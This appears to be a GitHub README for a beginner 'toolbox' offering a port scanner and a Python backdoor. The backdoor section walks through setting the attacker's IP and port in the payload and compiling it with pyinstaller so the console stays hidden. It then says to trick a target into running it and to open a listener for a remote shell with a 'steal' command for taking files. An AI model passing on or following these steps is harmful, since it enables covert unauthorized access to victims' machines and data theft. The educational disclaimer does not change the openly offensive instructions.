
# Kiddo Toolbox

A toolbox for the little ones in cybersecurity with simple UI and the set of all the basic features

## Disclaimer

The tools and software provided in this GitHub repository are intended for educational and research purposes only. The author of this repository does not condone or support any illegal activities, and the use of these tools for any malicious or unauthorized purposes is strictly prohibited.

The author does not take any responsibility for the misuse of these tools or any damage caused by their usage. It is the user's responsibility to ensure that they are using these tools in a legal and ethical manner, and to comply with all applicable laws and regulations.

By downloading and using the tools provided in this repository, you agree to use them at your own risk and accept full responsibility for any consequences that may result from their usage.

## Currently available tools

- Portscanner
- Backdoor

## Demo

- Portscanner
  
Select the single/multiple/range/subnet of targets, specify ports you're interested in, wait a sec and BOOM! You have'em all!

![portscanner demo](https://github.com/danyash17/kiddo_toolbox/blob/7c1dfdd0b433166e9f8a13cf4f1b738466a12177/project/demo/portscanner-demo.gif)

- Backdoor

Ever wanted to become a master of puppets? It's simple - just trick your target to execute a backdoor and gain a remote access to target machine!

![backdoor demo](project/demo/backdoor-demo.gif)


## Installation

- Portscanner
  
Nothing difficult - just clone and run.

```bash
  git clone https://github.com/danyash17/kiddo_toolbox.git
  cd kiddo_toolbox/project/src/toolbox/
  python3 portscanner.py
```

- Backdoor
  
More difficult to set up. First, clone a repo.

```bash
  git clone https://github.com/danyash17/kiddo_toolbox.git
  cd kiddo_toolbox/project/src/toolbox/
```

After that, it's crucial to configure your **host ip** and **listening port** in payload. Do not mess up - IP must be of type **string** and PORT of type **int**. I used Linux *nano* command down here, if you don't know what is it, just open **backdoor_payload.py** file in a notepad and write your **host ip** and **listening port** inside " " symbols, as in the example below.

```bash
  nano backdoor_payload.py
  ## IP = "192.168.0.100"
  ## PORT = 7777
```

So, the payload is configured. Now you need to transfer it to a target machine. You can simply put a python script *backdoor_payload.py* staight from this repo. Or, to do better, compile a binary executable to hide a console using *pyinstaller*.

```bash
  pyinstaller backdoor_payload.py --onefile --noconsole
```
After malicious delivery, be sure to run *backdoor_client.py* script to put up a listener. A payload will infinitely try to connect to client once it executed.

You see *shell* label in your console? Victory! You now have full access to a terminal of a target machine. In addition to standard bash commands this payload have 2 commands to download and upload files from/to target machine.

```bash
  shell~('192.168.0.100', 47890)steal <target_filename>
  shell~('192.168.0.100', 47890)upload <host_filename>
```

Feel free to explore it by yourself!
